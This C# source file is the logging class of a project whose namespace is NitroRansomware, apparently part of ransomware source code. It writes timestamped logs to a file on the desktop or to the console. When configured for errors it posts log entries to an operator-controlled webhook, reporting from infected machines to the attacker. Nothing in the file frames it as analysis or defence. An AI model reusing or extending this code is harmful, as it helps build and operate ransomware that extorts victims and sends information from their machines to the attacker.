using System;
using System.IO;

namespace NitroRansomware
{
    class Logs
    {
        private string save;
        private string filename;
        private string config;
        private int type;
        private Webhook ww = new Webhook(Program.WEBHOOK);

        public Logs(string configType, int outType)
        {
            save = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            filename = "\\logs.txt";
            config = configType;
            type = outType;
        }

        private void Write(string append, string message)
        {
            string logEntry = String.Format("{0} {1} - {2}", DateTime.Now.ToString("[hh:mm:ss]"), append, message);

            if (type == 1)
            {
                using (StreamWriter w = File.AppendText(save + filename))
                {
                    w.WriteLine(logEntry);
                }
            }
            else if (type == 0)
            {
                Console.WriteLine(logEntry);
            }
            else
            {
                using (StreamWriter w = File.AppendText(save + filename))
                {
                    w.WriteLine(logEntry);
                }
                Console.WriteLine(logEntry);
            }

            if (config == "ERROR" && type != 0)
            {
                ww.SendAsync("📜" + logEntry + "📜").GetAwaiter().GetResult();
            }
        }

        public void Debug(string message)
        {
            if (config == "DEBUG")
            {
                Write("DEBUG", message);
            }
        }

        public void Info(string message)
        {
            if (config == "DEBUG" || config == "INFO")
            {
                Write("INFO", message);
            }
        }

        public void Warning(string message)
        {
            if (config != "ERROR")
            {
                Write("WARNING", message);
            }
        }

        public void Error(string message)
        {
            Write("ERROR", message);
        }
    }
}
